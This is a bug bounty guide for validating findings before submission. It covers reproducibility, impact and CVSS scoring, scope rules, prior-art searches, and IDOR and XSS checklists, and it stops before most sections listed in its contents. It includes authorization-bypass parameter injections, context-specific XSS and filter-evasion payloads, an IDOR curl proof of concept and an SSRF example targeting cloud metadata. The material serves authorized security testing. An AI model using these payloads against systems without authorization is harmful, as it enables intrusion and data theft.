# Finding Validation Checklist

A comprehensive pre-submission validation framework for bug bounty hunters. Kill weak findings before they waste your time, protect your reputation, and maximize your payout per hour hunted.

Every guideline here is forged from real N/A rejections, duplicate closures, and severity downgrades. This is not theory — this is the combined cost of mistakes made by hundreds of hunters so you don't have to make them yourself.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [The 7-Question Gate](#2-the-7-question-gate)
3. [The 4 Validation Gates](#3-the-4-validation-gates)
   - [Gate 1: Reproducibility](#gate-1-reproducibility)
   - [Gate 2: Impact](#gate-2-impact)
   - [Gate 3: Scope & Rules](#gate-3-scope--rules)
   - [Gate 4: Novelty & Prior Art](#gate-4-novelty--prior-art)
4. [Class-Specific Validation Checklists](#4-class-specific-validation-checklists)
   - [IDOR](#idor)
   - [XSS](#xss)
   - [SSRF](#ssrf)
   - [SQLi](#sqli)
   - [Auth Bypass](#auth-bypass)
   - [RCE](#rce)
   - [Business Logic](#business-logic)
   - [Race Condition](#race-condition)
   - [File Upload](#file-upload)
   - [GraphQL](#graphql)
   - [SSTI](#ssti)
   - [Prototype Pollution](#prototype-pollution)
   - [Mass Assignment](#mass-assignment)
   - [JWT](#jwt)
   - [Cache Poisoning](#cache-poisoning)
   - [HTTP Smuggling](#http-smuggling)
5. [Evidence Preparation](#5-evidence-preparation)
6. [Report Writing](#6-report-writing)
7. [Pre-Submit Final Check](#7-pre-submit-final-check)
8. [Post-Submit Optimization](#8-post-submit-optimization)
9. [Comprehensive Master Checklist](#9-comprehensive-master-checklist)

---

## 1. Introduction

### Purpose of This Checklist

Every bug bounty hunter wastes hours on findings that go N/A. This checklist exists to kill those findings before they consume your time. It is a pre-submission gate that catches:

- Findings that cannot be reproduced from a clean session
- Findings that are technically interesting but have no real security impact
- Findings that are clearly out of scope
- Findings that have been reported before
- Findings with evidence that exposes your session or PII

**The goal:** Every finding that reaches submission should survive triage. Not every finding you submit will be accepted, but every finding you submit should be defensible.

### The Cost of N/A

| Cost | Description |
|------|-------------|
| Reputation hit | Programs track your N/A ratio. High N/A = less trust = longer triage times |
| Time waste | Average N/A finding costs 45 minutes of report writing + evidence prep |
| Emotional drain | Getting N/A on a finding you believed in kills momentum for the rest of the session |
| Opportunity cost | That 45 minutes could have been spent hunting a real bug |
| Account risk | Too many N/As can get you removed from private programs |

### When to Validate

```
Discovery → Initial reproduction → VALIDATION CHECKPOINT → Evidence → Report → Submit
                                       ↑
                           Do not skip this step
```

The validation checkpoint is between "I think I found something" and "Let me write the report." This is where you run this checklist. It costs 5-10 minutes and saves hours.

### The Golden Rule

**If you can't prove it, don't report it.**

"Prove it" means:
- Reproduce it from a clean session with clear steps
- Demonstrate real harm (data accessed, action performed, money lost)
- Show the evidence is clean and triage-ready
- Confirm it's in scope and novel

Everything else is a hobby, not a submission.

---

## 2. The 7-Question Gate

These 7 questions are your first filter. If any answer is NO, the finding is not ready for submission. Either fix the gap or kill the finding.

### Question 1: Can I reproduce this from scratch on a clean session?

**Why this matters:** If you can't reproduce it fresh, neither can the triager. Your browser state, cached tokens, or accidental admin privileges may be the real reason the bug worked.

**What "clean session" means:**
- New browser profile (incognito/private is not enough — use a separate browser)
- No cached credentials or session tokens
- Different IP address (if testing IP-based restrictions)
- Different user agent (if testing UA-based restrictions)
- Fresh authentication (log in from scratch each time)

**Test protocol:**
```
1. Close all browser windows
2. Open incognito/private window
3. Navigate to target directly (no bookmarks)
4. Authenticate with the test account
5. Attempt the reproduction in exactly 3 steps
6. If it doesn't work, your finding is not ready
```

**Pass condition:** The bug reproduces reliably (3/3 attempts or better).

**Fail examples:**
- "It worked once but I can't get it to work again" — N/A
- "It works when I'm logged in as admin" — that's not a vulnerability, that's admin access
- "It works after I clicked around randomly for 10 minutes" — triager won't do that

### Question 2: Does this actually violate a security boundary?

**Why this matters:** Many "bugs" are design choices, not security vulnerabilities. Just because something behaves unexpectedly doesn't mean it's a security issue.

**Security boundaries that matter:**
- Authentication boundary (unauthenticated → authenticated)
- Authorization boundary (user → another user, user → admin)
- Tenant boundary (user A's data → user B's access)
- Input validation boundary (untrusted input → code execution)
- Cryptography boundary (encrypted → plaintext, signed → forged)
- Session boundary (user A's session → user B's session)

**Non-security issues that are not bugs:**
- CSS styling quirks
- Missing rate limiting on non-sensitive endpoints
- Verbose error messages that don't leak sensitive data
- UI elements that don't match the design spec
- Missing CSRF token on a GET endpoint (GET is not supposed to change state)
- Self-XSS (you can only inject into your own page)

**Pass condition:** The finding crosses a clear security boundary. If you have to explain for 5 minutes why it's a security issue, it's probably not one.

### Question 3: Can I demonstrate real harm to a user or the business?

**Why this matters:** Programs pay for impact, not for technical cleverness. A technically impressive bug with no real harm is an N/A.

**Real harm examples:**
- Data exposure: "I can read any user's private messages"
- Data modification: "I can change any user's password"
- Data deletion: "I can delete any user's files"
- Financial: "I can place orders using another user's payment method"
- Reputational: "I can post content that appears to come from another user"
- Operational: "I can take down the service for other users"

**Theoretical harm (kill these):**
- "An attacker could potentially..." — stop. Prove it or drop it.
- "If an attacker chains this with another bug..." — chain it first, then report
- "This could lead to X in some circumstances" — show those circumstances
- "This is a bad practice" — bad practice is not a vulnerability

**Impact demonstration checklist:**
- [ ] Can I show the actual data that was exposed?
- [ ] Can I show the actual action that was performed?
- [ ] Can I quantify the financial/reputational/operational cost?
- [ ] Is the user affected a real user (not an admin account)?
- [ ] Does the impact affect users in production (not a staging environment)?

**Pass condition:** You can describe the impact in one sentence without using the word "could."

### Question 4: Is this in scope?

**Why this matters:** Scope violations are the #1 reason for N/A. Even if you check the visible scope, make sure you check every scope entry.

**Scope sources to check:**
- Program description (top-level)
- Scope tab (HackerOne) or Asset List (Bugcrowd)
- Program rules (collapsible sections)
- Program policy (separate document)
- Out of scope list (often in a separate section)
- In-scope exclusions (sections of the application listed as "out of scope")
- Previous program updates (scope changes)

**Scope pitfalls:**
- Third-party services may be out of scope even if they appear on the target domain
- Old API versions may be out of scope
- Acquired companies may not be in scope until 60-90 days post-acquisition
- Staging/test environments are often explicitly out of scope
- Subdomains without wildcard coverage may be out of scope
- Rate limiting is generally acceptable unless it causes account lockout
- Automated scanning may be prohibited (read the rules)

**Common out-of-scope categories:**

| Category | Example |
|----------|---------|
| Self-XSS | XSS that only affects your own session |
| Missing headers | Missing HSTS, X-Frame-Options, X-Content-Type-Options |
| Rate limiting | Missing rate limits on POST endpoints |
| Email spoofing | Missing SPF/DKIM (may be in scope, check rules) |
| Social engineering | Phishing, vishing, physical access |
| DoS/DDoS | Any denial of service attack |
| SPF/DKIM/DMARC | Email authentication issues (in scope on some programs) |
| Open redirect | Without a demonstrated chain to steal credentials |

**Pass condition:** Every asset involved in the finding is explicitly or implicitly in scope, and no program rule prohibits the testing method you used.

### Question 5: Is this novel?

**Why this matters:** Submitting a duplicate wastes your time and the triager's time. It also affects your rep on the platform.

**Prior art search protocol:**
1. Search the program's disclosed reports (HackerOne Hacktivity, Bugcrowd disclosure)
2. Search H1 disclosure page for the target
3. Search Google for `site:hackerone.com targetname vulnerability`
4. Search GitHub for the target's security issues
5. Search the platform for similar findings from the past 90 days
6. Check the program's known issues / acknowledged vulnerabilities page
7. Search for CVEs related to the target's software stack

**How to prove novelty:**
- Document the exact reproduction steps that differ from known findings
- Note the specific endpoint, parameter, or condition that is unique
- If a similar finding exists, explain how yours is different:
  - Different endpoint
  - Different impact
  - Different attack vector
  - Different version of the software

**What to do with a near-duplicate:**
- If the existing finding is within 30 days and on the same endpoint — kill yours
- If the existing finding is on a different endpoint but same class — yours may still be valid
- If the existing finding was fixed and you found a bypass — yours is novel
- If the existing finding was marked as N/A and yours is different — yours is novel

**Pass condition:** No identical or near-identical finding exists in the program's disclosed reports or the wider bug bounty community.

### Question 6: Can I write clear reproduction steps that a triager can follow?

**Why this matters:** If the triager can't reproduce it in 2 minutes, they will mark it as N/A. Triagers have 50+ reports to review per day. Yours must be fast and easy.

**Good reproduction steps:**
```
1. Register two accounts: victim@example.com and attacker@example.com
2. Log in as victim, create a document at POST /api/documents with title "secret"
3. Note the document ID from the response: { "id": 1234 }
4. Log out, log in as attacker
5. Send GET /api/documents/1234
6. Observe the response contains victim's document with title "secret"
```

**Bad reproduction steps:**
```
1. Do some stuff
2. Then some other stuff
3. It should show the bug (kill this now)
```

**Reproduction step requirements:**
- Every step must be a specific, actionable instruction
- Include exact HTTP methods, paths, headers, and body
- Include account credentials (test accounts, not real accounts)
- Include expected vs actual results for each step
- Number every step
- Total steps should be under 10 for most findings
- Each step should take under 10 seconds to execute

**Pass condition:** You can hand your reproduction steps to another hunter and they can reproduce the bug without asking you a single question.

### Question 7: Do I have clean evidence?

**Why this matters:** Evidence with exposed session tokens, cookies, PII, or internal IPs will be rejected. The triager will not accept evidence you need to "explain away."

**Evidence that must be redacted:**
- Session cookies: `sessionid`, `connect.sid`, `JSESSIONID`, `PHPSESSID`
- Auth tokens: Bearer tokens, JWT tokens, API keys
- Personal emails of other users (yours is OK if you're the attacker)
- Real names of other users
- Phone numbers
- Physical addresses
- Credit card numbers or payment details
- Internal IP addresses (10.x.x.x, 172.16-31.x.x, 192.168.x.x)
- Internal hostnames (without domain)

**Evidence that is safe to show:**
- Usernames (not emails) — these are public identifiers
- Trace IDs, request IDs, correlation IDs — these are ephemeral
- Your own test account email
- Your own test account data
- Generic error messages that don't leak data
- Application endpoints and paths

**Redaction methods:**
- Black bar (rectangle) — NOT blur (blur can be reversed)
- Replace with placeholder text: `[REDACTED]`, `[COOKIE REDACTED]`
- Use square annotation tool to draw boxes over sensitive fields
- Always redact at the full response level, not per-field

**Pass condition:** You can send your evidence to a stranger on the internet without exposing any sensitive information.

### Decision Tree

```
Q1: Reproducible from clean session?
  NO → Spend 10 minutes trying to reproduce. If still no, move on.
  YES → Continue.

Q2: Violates security boundary?
  NO → Kill it. Not a security issue.
  YES → Continue.

Q3: Real harm demonstrated?
  NO → Is there a chain that makes it real? If not, kill it.
  YES → Continue.

Q4: In scope?
  NO → Kill it. Unless you can argue scope expansion (rarely works).
  YES → Continue.

Q5: Novel?
  NO → If identical to existing finding, kill it. If different, note the difference.
  YES → Continue.

Q6: Clear reproduction steps?
  NO → Rewrite them until they are clear. Test them on a friend.
  YES → Continue.

Q7: Clean evidence?
  NO → Redact the evidence. If the evidence can't be cleaned, re-capture it.
  YES → Submit.
```

---

## 3. The 4 Validation Gates

After the 7-Question Gate, run through the 4 Validation Gates. These are deeper checks that ensure your finding is submission-ready.

### Gate 1: Reproducibility

#### Clean Session Protocol

Before you write a single word of the report, reproduce the bug from a completely clean state.

```
┌─────────────────────────────────────────────────┐
│             Clean Session Protocol              │
├─────────────────────────────────────────────────┤
│ Step 1: Close all browser windows               │
│ Step 2: Use a different browser than usual      │
│ Step 3: Open incognito/private mode             │
│ Step 4: Clear all DNS cache (ipconfig /flushdns)│
│ Step 5: Do not import any bookmarks or settings │
│ Step 6: Navigate directly to the target URL     │
│ Step 7: Authenticate (manually type credentials)│
│ Step 8: Execute reproduction steps exactly      │
│ Step 9: Record the result                       │
│ Step 10: Repeat 3 times total                   │
└─────────────────────────────────────────────────┘
```

**If reproduction fails on any attempt:**
- Note what was different (network, timing, account state)
- Try with a different test account
- Try at a different time of day
- Try from a different IP address
- If it still fails, the finding is not reliable enough to submit

#### Minimum Viable PoC

The best PoC is a curl command that the triager can paste into their terminal:

```bash
# Example: IDOR PoC
curl -s -H "Authorization: Bearer <attacker_token>" \
  "https://api.target.com/api/documents/1234" | jq .

# Expected: victim's document data
# Actual: 404 or 403 (if the bug doesn't exist)
# Actual: victim's document data (if the bug exists)
```

**Burp screenshots are not a PoC.** They are supporting evidence. The actual PoC must be a command or code that reproduces the finding.

#### Account Prerequisites

Document every account needed:

| Finding Type | Accounts Required | Purpose |
|-------------|-------------------|---------|
| Horizontal IDOR | 2 (victim + attacker) | Victim creates resource, attacker accesses it |
| Vertical IDOR | 2 (user + admin) | User accesses admin endpoint |
| XSS (stored) | 2 (victim + attacker) | Attacker stores payload, victim triggers it |
| XSS (reflected) | 1 (victim) | Victim clicks attacker's crafted link |
| SSRF | 1 (attacker) | Server makes request to attacker-controlled endpoint |
| Auth bypass | 1 (attacker) | Attacker accesses privileged endpoint without auth |
| Race condition | 1 (attacker) | Multiple concurrent requests to the same endpoint |
| Business logic | 2+ (varies) | Multiple accounts for complex workflows |

**Always use test accounts.** Never use real user accounts for testing.

#### Environment Prerequisites

Document every environment detail that matters:

- Browser name and version (Chrome 125, Firefox 127)
- Operating system and version (Windows 11, macOS 14.5)
- Tooling used (Burp Suite 2024.8, curl 8.7)
- Network conditions (normal, VPN, specific geographic region)
- Application state (empty account, account with 5+ documents)
- Time of day (if timing-dependent)
- Previous steps done before reproduction

**If environment matters:** Reproduce on a different environment (different OS, different browser, different network). If it only works in one specific environment, note it clearly.

#### Reproducibility Across Conditions

A robust finding reproduces under different conditions:

| Condition | Test | Pass Criteria |
|-----------|------|---------------|
| Different IP | Use VPN or different network | Still reproduces |
| Different session | New login, new token | Still reproduces |
| Different user agent | Change UA string | Still reproduces |
| Different time | Test morning and evening | Still reproduces |
| Different account | Create a new account | Still reproduces |
| Different browser | Try Chrome and Firefox | Still reproduces |

#### Common Reproducibility Pitfalls

| Pitfall | Why It Happens | How to Avoid |
|---------|---------------|--------------|
| Token-specific bug | Your token has elevated privileges | Use minimum-privilege test accounts |
| Cache-dependent | CDN cache served your own request back | Add cache-busting param: `?nocache=1` |
| Timing-dependent | Race condition window is narrow | Script the race with parallel requests |
| Session-dependent | Multiple sessions influence state | Log out completely between tests |
| Rate-limit masking | Rate limiter blocks after first attempt | Wait 60 seconds between attempts |
| WAF interference | WAF blocks after pattern is detected | Use different payload patterns |

### Gate 2: Impact

#### Real Harm Demonstration

For every finding, answer one question: **What can an attacker actually do with this?**

**IDOR impact examples:**
```
Weak: "An attacker could access other users' documents"
Strong: "An attacker can read any user's passport upload by changing the document_id parameter from 1 to 2. I accessed 1000 user documents in 60 seconds."
```

**XSS impact examples:**
```
Weak: "An attacker could execute JavaScript in the victim's browser"
Strong: "An attacker can steal session cookies via document.cookie and exfiltrate them to attacker-controlled server. This allows account takeover without the victim's password."
```

**SSRF impact examples:**
```
Weak: "The server makes requests to URLs I control"
Strong: "The server fetches my webhook URL and I can make it connect to internal services. I accessed the AWS metadata endpoint at http://169.254.169.254/latest/meta-data/ and retrieved the cloud provider credentials."
```

#### CVSS 3.1 Scoring

Calculate the CVSS 3.1 score for every finding. The formula:

```
Base Score = Impact + Exploitability + Scope
```

**Attack Vector (AV)**

| Value | Meaning | Examples |
|-------|---------|----------|
| AV:N | Network — attackable from the internet | Any web bug, API bug, network service |
| AV:A | Adjacent — requires same network segment | ARP spoofing, Bluetooth, WiFi |
| AV:L | Local — requires local access or shell | Local privilege escalation |
| AV:P | Physical — requires physical access | USB drop, console access |

**Attack Complexity (AC)**

| Value | Meaning | Examples |
|-------|---------|----------|
| AC:L | Low — no special conditions | Standard request with standard tooling |
| AC:H | High — requires special conditions | Race condition with 1ms window, requires specific timing |

**Privileges Required (PR)**

| Value | Meaning | Examples |
|-------|---------|----------|
| PR:N | None — unauthenticated | Public API endpoint with no auth |
| PR:L | Low — basic user account | Authenticated user (standard role) |
| PR:H | High — admin or elevated access | Admin account, root access |

**User Interaction (UI)**

| Value | Meaning | Examples |
|-------|---------|----------|
| UI:N | None — attacker acts alone | API call, direct request |
| UI:R | Required — victim must do something | Click a link, upload a file |

**Scope (S)**

| Value | Meaning | Examples |
|-------|---------|----------|
| S:U | Unchanged — impact stays in component | XSS in the user's own session |
| S:C | Changed — impact affects other components | SSRF that reaches cloud metadata (different security context) |

**Confidentiality (C)**

| Value | Meaning | Examples |
|-------|---------|----------|
| C:N | None — no data exposure | Rate limiting bypass |
| C:L | Low — limited disclosure | Read access to non-sensitive fields |
| C:H | High — full disclosure | Read access to all user data, PII, credentials |

**Integrity (I)**

| Value | Meaning | Examples |
|-------|---------|----------|
| I:N | None — no data modification | Read-only IDOR |
| I:L | Low — limited modification | Change non-critical data |
| I:H | High — full modification | Change passwords, modify financial data |

**Availability (A)**

| Value | Meaning | Examples |
|-------|---------|----------|
| A:N | None — service availability unaffected | Most data exposure bugs |
| A:L | Low — reduced performance | Slow endpoint |
| A:H | High — service unavailable | DoS, database corruption |

**CVSS Vector Examples:**

```
IDOR reading another user's documents:
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Base Score 6.5 (Medium)

XSS with cookie theft:
AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N — Base Score 7.1 (High)

SSRF to cloud metadata:
AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N — Base Score 7.7 (High)

Unauthenticated RCE:
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Base Score 9.8 (Critical)
```

**Use the CVSS v3.1 Calculator:** https://www.first.org/cvss/calculator/3.1

#### Impact Calculation by Vulnerability Class

**IDOR:**

| Impact Level | What You Can Access |
|--------------|---------------------|
| Info (3.0-3.9) | Non-sensitive metadata (timestamps, file names without content) |
| Low (4.0-4.9) | Basic profile info (name, username, avatar URL) |
| Medium (5.0-6.9) | Sensitive data (email, phone, address) |
| High (7.0-8.9) | Financial data, private messages, documents with content |
| Critical (9.0-10.0) | PII of all users, admin credentials, payment methods |

**XSS:**

| Impact Level | What You Can Execute |
|--------------|----------------------|
| Low (4.0-4.9) | Self-XSS, DOM-based in own session |
| Medium (5.0-6.9) | Stored XSS visible to others but limited by CSP |
| High (7.0-8.9) | Stored XSS with full CSP bypass, cookie theft |
| Critical (9.0-10.0) | XSS in admin panel, chained to ATO, no CSP |

**SSRF:**

| Impact Level | What You Can Reach |
|--------------|--------------------|
| Low (4.0-4.9) | External URLs only, blind SSRF |
| Medium (5.0-6.9) | Internal services on non-standard ports |
| High (7.0-8.9) | Cloud metadata endpoints, internal admin panels |
| Critical (9.0-10.0) | Cloud metadata with credentials, RCE via internal service |

**Auth Bypass:**

| Impact Level | What You Can Access |
|--------------|---------------------|
| Medium (5.0-6.9) | Low-privilege endpoints without auth |
| High (7.0-8.9) | Medium-privilege endpoints (user management, content moderation) |
| Critical (9.0-10.0) | Admin endpoints, user impersonation, payment management |

**RCE:**

| Impact Level | What You Can Execute |
|--------------|----------------------|
| High (7.0-8.9) | Command execution on isolated container |
| Critical (9.0-10.0) | Command execution with network access, data exfiltration possible |

#### Business Impact Translation

Translate technical impact into business language:

```
Technical: "SQL injection in the search parameter allows UNION-based data extraction"
Business:  "An attacker can steal the entire user database including hashed passwords and PII. This exposes 2 million users to credential stuffing attacks."

Technical: "IDOR in the invoice download endpoint allows accessing any invoice by ID"
Business:  "An attacker can view billing details and payment methods of any customer, leading to PCI compliance violations and financial fraud."

Technical: "SSRF in the PDF generator allows accessing internal services"
Business:  "An attacker can pivot to internal infrastructure, access cloud metadata servers, and potentially compromise the entire cloud environment."
```

#### Severity Decision Guide

```
┌─────────────────────────────────────────────────────┐
│                  Severity Decision                   │
├─────────────────────────────────────────────────────┤
│ Is the finding unauthenticated?                     │
│   YES → Add +1 severity tier                        │
│                                                      │
│ Does the finding expose PII?                        │
│   YES → Minimum Medium                              │
│                                                      │
│ Does the finding allow data modification?           │
│   YES → Minimum High                                │
│                                                      │
│ Does the finding allow privilege escalation?        │
│   YES → +1 severity tier from what was found        │
│                                                      │
│ Does the finding affect ALL users?                  │
│   YES → +1 severity tier                            │
│                                                      │
│ Can the finding be chained for ATO?                 │
│   YES → +1 severity tier from the chain impact      │
│                                                      │
│ Does the finding require user interaction?          │
│   YES → Consider -1 severity tier                    │
│                                                      │
│ Is the impact difficult to weaponize?               │
│   YES → Consider -1 severity tier                    │
│                                                      │
│ Final severity:                                      │
│   Critical (9.0-10.0): RCE, auth bypass to admin,    │
│     full PII database access                         │
│   High (7.0-8.9): ATO, SSRF to metadata, SQLi dumping│
│   Medium (5.0-6.9): IDOR reading sensitive data, XSS │
│   Low (3.0-4.9): Information disclosure, minor logic  │
│   Info (0.0-2.9): Missing headers, fingerprinting     │
└─────────────────────────────────────────────────────┘
```

### Gate 3: Scope & Rules

#### Scope Checklist by Program Type

**HackerOne:**

```
[ ] Main target domain is in scope
[ ] All listed subdomains and wildcards are checked
[ ] Out of scope list does NOT include the affected asset
[ ] Program rules do NOT prohibit the testing method used
[ ] If the asset was recently acquired, check 60-90 day rule
[ ] Third-party services hosting target content are checked
[ ] Old API versions are checked (often have separate scope)
```

**Bugcrowd:**

```
[ ] Asset list includes the affected URL or domain
[ ] Target group is correct (V1, V2, standard, etc.)
[ ] VRT category is correctly identified
[ ] Rate limiting is not listed as out of scope
[ ] Program level (1-5) allows the testing depth used
[ ] Priority routing rules are followed
```

**Immunefi:**

```
[ ] Contract address is explicitly in scope
[ ] TVL (Total Value Locked) meets minimum requirements
[ ] Impact level matches the finding type (Critical/High/Medium)
[ ] Testing on mainnet (not testnet)
[ ] No active exploit being tested (read the rules)
[ ] Proper disclosure process followed
```

**Intigriti:**

```
[ ] Scope boundaries clearly include the affected domain
[ ] Program rules allow the testing methodology
[ ] Target is not marked as "limited" or "info only"
[ ] Proper disclosure process followed
```

**Private Programs:**

```
[ ] NDA does not restrict disclosure of this finding type
[ ] Special instructions are followed (if any)
[ ] Program-specific scope exclusions are checked
[ ] Testing is allowed on the production environment
[ ] The program allows this type of testing (some ban automated scanning)
```

#### Common Scope Pitfalls

**Third-Party Services**

Just because a feature uses a third-party service doesn't mean that service is in scope:

```
Example: Target.com uses Stripe for payments.
         Finding a bug in Stripe's API implementation is in scope.
         Finding a bug in Stripe's core payment processing is in Stripe's scope.
```

**Old Versions**

Older API versions are often left running without being updated:

```
/api/v1/endpoint — may be scoped
/api/v2/endpoint — may be scoped
/api/v3/endpoint — may be scoped

Check EACH version individually. V1 may have bugs that V3 fixed.
```

**Acquisition-Related Assets**

When a company acquires another, the acquired company's assets may not move into scope for 30-90 days:

```
2026-01-01: Company A acquires Company B
2026-01-15: You find a bug on Company B's subdomain
           → May be out of scope until 2026-03-01 (90-day rule)
```

**Staging/Test Environments**

```
staging.target.com        — Often out of scope
dev.target.com            — Often out of scope
test.target.com           — Often out of scope
sandbox.target.com        — Often out of scope
admin.target.com          — May be in scope
api.target.com            — Usually in scope
```

**Rate Limiting on Auth Endpoints**

Some programs consider rate limiting on login endpoints as acceptable. Check the rules:

```
In scope:   "Rate limiting bypass that allows credential brute-force"
Out scope:  "Rate limiting on registration endpoint"
Depends:    "Rate limiting on 2FA endpoint — check program rules"
```

#### Automated Scanning Rules

| Program Stance | What You Can Do |
|---------------|-----------------|
| Allowed | Run any scanner, any time |
| Allowed with limits | No aggressive scanning (limited threads, delays between requests) |
| Manual testing only | No automated scanners at all |
| Specific tools allowed | Only certain tools (Burp, curl, etc.) are permitted |
| Prior approval needed | Must request permission before scanning |

**If automated scanning is prohibited:**
- Do not use Burp Intruder with 1000+ payloads
- Do not run nuclei, ffuf, or similar tools
- Manual testing only: modify parameters by hand, test one at a time

#### Always Out of Scope (Unless Explicitly Listed)

```
[ ] Self-XSS — XSS where the payload executes only in your own session
[ ] Missing security headers — HSTS, X-Frame-Options, X-Content-Type-Options
[ ] Missing CSP headers (without a demonstrated bypass)
[ ] Email spoofing — SPF, DKIM, DMARC misconfigurations
[ ] Banner grabbing / version fingerprinting
[ ] OPTIONS / TRACE HTTP methods enabled
[ ] Directory listing (without sensitive files accessible)
[ ] Rate limiting on non-critical endpoints
[ ] CSRF on logout endpoints
[ ] Clickjacking (unless demonstrated with impact on sensitive action)
[ ] Password complexity policies
[ ] Account enumeration via timing (unless combined with brute-force)
[ ] SSL/TLS configuration issues (weak ciphers, outdated protocols)
[ ] Reflected file download (without demonstrated impact)
[ ] Host header injection (without demonstrated impact)
[ ] Verbose error messages (without sensitive data leakage)
[ ] Open CORS (without demonstrated data exfiltration)
[ ] Open redirect (without demonstrated chain to steal credentials)
```

**Exception:** Some programs explicitly include these items. Always check the rules first.

#### Special Rules

Some programs have unique constraints:

```
[ ] Testing allowed only on weekdays (Mon-Fri, 9am-5pm local time)
[ ] Testing allowed only on specific accounts
[ ] Maximum number of requests per second/minute
[ ] No testing on specific user types (e.g., no VIP account testing)
[ ] Report use of test accounts in the submission
[ ] Do not use proof-of-concept that modifies real data
[ ] No automated scanning during business hours
[ ] Maximum concurrent testing sessions
[ ] Geographic restrictions on testing (only from certain countries)
```

**Always read the full program rules before starting to hunt.**

### Gate 4: Novelty & Prior Art

#### Prior Art Search Protocol

Follow this exact protocol before submitting:

```
Step 1: Search the program's disclosed reports page
  URL: hackerone.com/target_name/hacktivity (HackerOne)
  URL: bugcrowd.com/target_name/disclosures (Bugcrowd)

Step 2: Search the program's acknowledgments page
  URL: hackerone.com/target_name/acknowledgments
  URL: bugcrowd.com/target_name/researchers

Step 3: Google search for similar findings
  Query: site:hackerone.com target_name [vulnerability type]
  Query: site:bugcrowd.com target_name [vulnerability type]
  Query: "target_name" "security" "vulnerability" "disclosure"
  Query: "target_name" "IDOR" "bug bounty"
  Query: "target_name" CVE

Step 4: GitHub search for related issues
  Query: org:target_name security
  Query: org:target_name vulnerability
  Query: target_name/blob master security

Step 5: Search the CVEDetails database
  Query: target_name CVE

Step 6: Search Exploit-DB
  Query: target_name (software/framework name)

Step 7: Search medium.com / dev.to for writeups
  Query: site:medium.com target_name bug bounty
  Query: site:infosecwriteups.com target_name
```

#### Proving Your Finding Is Different

Document the difference from the closest known finding:

| Aspect | Known Finding | Your Finding |
|--------|--------------|--------------|
| Endpoint | /api/v2/documents/{id} | /api/v3/documents/batch |
| Parameter | document_id in URL | document_ids[] in body |
| Method | GET request | POST request |
| Auth required | No (unauthenticated) | Yes (authenticated user) |
| Impact | Read document metadata | Read document content |
| Scope | Single document | Batch of 100 documents |
| Version | API v2 | API v3 |

**Template for documenting novelty:**

> **Known issue:** A previous disclosure (hackerone.com/reports/12345) showed IDOR in `GET /api/v2/documents/{id}` which was fixed by adding owner_id validation.
>
> **Our finding:** The same validation was NOT applied to the new batch endpoint `POST /api/v3/documents/batch`. By sending `{"document_ids": [1,2,3,4,5]}`, we can access documents belonging to any user. This is a bypass of the previous fix because the batch endpoint was added in v3 without the same validation.
>
> **Status:** Novel — this is a regression bypass of the v2 fix.

#### Near-Duplicate Protocol

If you find a near-duplicate (similar but not identical):

1. **Document the differences** in clear, bullet-point format
2. **Explain why the differences matter** (different endpoint = different fix needed)
3. **Compare impacts** — is yours worse? Better? Same?
4. **If yours is strictly worse:** Yours may be a higher severity
5. **If yours is strictly better:** Yours is likely novel
6. **If yours is the same but on a different endpoint:** Submit it, triagers often accept these
7. **If yours is identical:** Kill it. Not worth the N/A.

#### Regression Check

Check if your bug is a regression of a previously fixed issue:

```
[ ] Was this bug reported before? (Search disclosed reports)
[ ] If yes, what was the fix?
[ ] Does the fix still exist in the current code?
[ ] Can you bypass the fix?
[ ] If you can bypass the fix, document how the bypass works
[ ] If the fix is absent (regression), note the commit where it was removed
```

---

## 4. Class-Specific Validation Checklists

### IDOR

**Detection checklist:**
- [ ] Identified all object IDs in API responses (numeric, UUID, hash)
- [ ] Tested all HTTP methods on every object endpoint (GET, PUT, DELETE, POST)
- [ ] Tested by changing object ID in URL path
- [ ] Tested by changing object ID in request body
- [ ] Tested by changing object ID in query parameters
- [ ] Tested batch operations for cross-user access
- [ ] Tested list endpoints with pagination params (page=2, user=all)
- [ ] Tested search endpoints for cross-user results
- [ ] Tested export functionality for full data dump
- [ ] Tested WebSocket channels for cross-user message access
- [ ] Tested GraphQL queries without user context filter
- [ ] Tested with two distinct accounts (victim + attacker)
- [ ] Tested from incognito/clean session
- [ ] Confirmed the accessed data belongs to a different user
- [ ] Tested mass assignment on object creation/update
- [ ] Verified that UUID-based IDs do not prevent access (UUID is not auth)

**Authorization check bypass tests:**
```
Parameter injections to try:
  ?admin=true
  ?internal=1
  ?scope=all
  ?user_id=*
  ?organization_id=0
  ?debug=1
  ?X-Debug=true
  ?impersonate=true
  ?as_user_id=123
  ?mode=admin
  ?role=superuser
```

**Common validation failures:**
```
ID in URL path → tested        [ ]
ID in query param → tested     [ ]
ID in request body → tested    [ ]
ID in cookie → tested          [ ]
ID in header → tested          [ ]
ID in GraphQL args → tested    [ ]
```

### XSS

**Context-aware validation:**
- [ ] Identified the injection context (HTML, attribute, JavaScript, CSS, URL)
- [ ] Verified the context escape characters work
- [ ] Tested with standard payload `<script>alert(1)</script>`
- [ ] Tested with polyglot payloads that work in multiple contexts

**Context-specific payloads:**

| Context | Example Payload | Requirement |
|---------|----------------|-------------|
| HTML between tags | `<img src=x onerror=alert(1)>` | Must break out of existing HTML |
| HTML attribute | `" onmouseover="alert(1)` | Must close the attribute with `"` |
| JavaScript string | `'-alert(1)-'` | Must break out of JS string |
| JavaScript URL | `javascript:alert(1)` | Must be in href/src attribute |
| CSS | `background:url("javascript:alert(1)")` | IE-specific, rarely works |
| Template literal | `${alert(1)}` | Must be in template literal context |

**CSP bypass tests:**
- [ ] Checked CSP header in response
- [ ] Tested script injection despite CSP
- [ ] Checked for CSP bypass via JSONP endpoints
- [ ] Checked for CSP bypass via file upload (uploaded .js file)
- [ ] Checked for CSP bypass via unsafe-inline with nonce
- [ ] Checked for CSP bypass via Angular/Vue/React template injection
- [ ] Checked for CSP bypass via base-uri manipulation

**Filter evasion tests:**
- [ ] Tested uppercase `<SCRIPT>alert(1)</SCRIPT>`
- [ ] Tested mixed case `<ScRiPt>alert(1)</ScRiPt>`
- [ ] Tested double encoding `%253Cscript%253E`
- [ ] Tested Unicode encoding `\u003Cscript\u003E`
- [ ] Tested hex encoding `&#60;script&#62;`
- [ ] Tested event handlers without tags `onerror=alert(1)`
- [ ] Tested SVG vector `<svg><script>alert(1)</script></svg>`
